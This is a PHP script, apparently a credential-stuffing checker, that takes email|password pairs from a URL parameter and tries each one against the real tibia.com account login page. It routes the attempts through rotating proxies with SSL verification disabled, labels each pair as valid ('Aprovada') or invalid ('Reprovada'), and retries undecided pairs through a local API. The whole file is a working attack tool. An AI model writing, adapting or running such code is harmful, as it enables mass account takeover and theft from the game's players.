<?php
set_time_limit(0);
error_reporting(0);
DeletarCookies();

extract($_GET);

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function deletarCookies() {
    if (file_exists("cookie.txt")) {
        unlink("cookie.txt");
    }
}



$lista = str_replace(" ", "", $lista);
$separa = explode("|", $lista);
$email = $separa[0];
$senha = $separa[1];


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://localhost/projetos/tibiaglobal/includes/proxy.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$proxy = curl_exec($ch);

curl_setopt($ch, CURLOPT_URL, "https://www.tibia.com/account/?subtopic=accountmanagement"); 
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0); 
curl_setopt($ch, CURLOPT_TIMEOUT, 0); //timeout in seconds
curl_setopt($ch, CURLOPT_HTTPHEADER, 0); 
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt'); 
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt'); 
curl_setopt($ch, CURLOPT_POST, 0); 
$passo1 = curl_exec($ch); 



curl_setopt($ch, CURLOPT_URL, "https://www.tibia.com/account/?subtopic=accountmanagement");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'loginname='.$email.'&loginpassword='.$senha.'&page=overview&Login.x=14&Login.y=4');
$passo2 = curl_exec($ch);



if (stristr($passo2, "Welcome to your account")) { 
	echo '<i style="color: lime; text-shadow: 0 0 10px lime;" class="fa fa-circle"></i> <font color=lime>Aprovada &#10008;</font> '.$email.' | '.$senha.'<br>';
} else if(stristr($passo2, "Account name or password is not correct")) {
	echo '<i style="color: lime; text-shadow: 0 0 10px lime;" class="fa fa-circle"></i> <font color=red>Reprovada &#10008;</font> '.$email.' | '.$senha.'<br>';
} else{
	curl_setopt($ch, CURLOPT_URL, 'http://localhost/tibiaglobal/includes/api.php?lista='.$email.'|'.$senha.'');
	curl_setopt($ch, CURLOPT_PROXY, '');
	curl_setopt($ch, CURLOPT_POST, 0);
	$retry = curl_exec($ch);
	echo "$retry";
}
?>